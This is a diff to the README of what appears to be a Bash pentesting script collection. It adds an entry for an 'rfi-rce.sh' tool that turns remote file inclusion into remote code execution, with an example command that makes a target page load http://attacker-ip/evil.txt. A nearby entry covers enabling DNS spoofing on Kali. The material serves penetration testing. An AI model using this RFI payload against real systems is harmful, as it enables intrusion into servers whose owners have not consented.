@@ -48,7 +48,12 @@ for f in $files; do cp "$f" /usr/local/bin/"${f%.sh}"; done
  ![absolutepathit.sh results improvement](https://raw.githubusercontent.com/tobor88/Bash/master/absolutepathit_img2.png)
  
  The issue I noticed came from another script came from a website in the bash script. This is because the slash is viewed as an escape character. Any contributions are welcome. This is still a work in progress.
- 
+
+- __rfi-rce.sh__ This is a command that can be used to simplify RCE by exploiting it in a shell like fashion.
+```bash
+rfi-rce -f /var/www/html/evil.txt -u "http://target-ip/section.php?page=http://attacker-ip/evil.txt"
+```
+![rfi-rce.sh](https://raw.githubusercontent.com/tobor88/Bash/master/rfi-rce.png)
 
 - __enablespoofing.sh__ This is a simple script meant to take care of the tasks neccessary to allow dns spoofing on Kali Linux. It enables port forwarding on ipv4 and allows DNS traffic.
 
